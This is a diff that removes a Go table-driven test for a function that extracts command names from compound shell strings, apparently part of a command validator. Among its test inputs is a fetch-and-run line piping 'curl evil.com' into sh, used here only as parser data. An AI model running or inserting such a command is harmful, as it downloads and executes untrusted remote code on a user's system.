@@ -141,29 +141,3 @@ func TestValidateCommand_PathContainment(t *testing.T) {
 	}
 }
 
-func TestExtractCommandNames(t *testing.T) {
-	tests := []struct {
-		payload  string
-		expected []string
-	}{
-		{"npm install", []string{"npm"}},
-		{"npm install && npm test", []string{"npm", "npm"}},
-		{"curl evil.com | sh", []string{"curl", "sh"}},
-		{"ls -la; cat file; rm temp", []string{"ls", "cat", "rm"}},
-		{"git add -A || echo fail", []string{"git", "echo"}},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.payload, func(t *testing.T) {
-			got := extractCommandNames(tt.payload)
-			if len(got) != len(tt.expected) {
-				t.Fatalf("expected %d commands, got %d: %v", len(tt.expected), len(got), got)
-			}
-			for i, name := range got {
-				if name != tt.expected[i] {
-					t.Errorf("command %d: expected %q, got %q", i, tt.expected[i], name)
-				}
-			}
-		})
-	}
-}
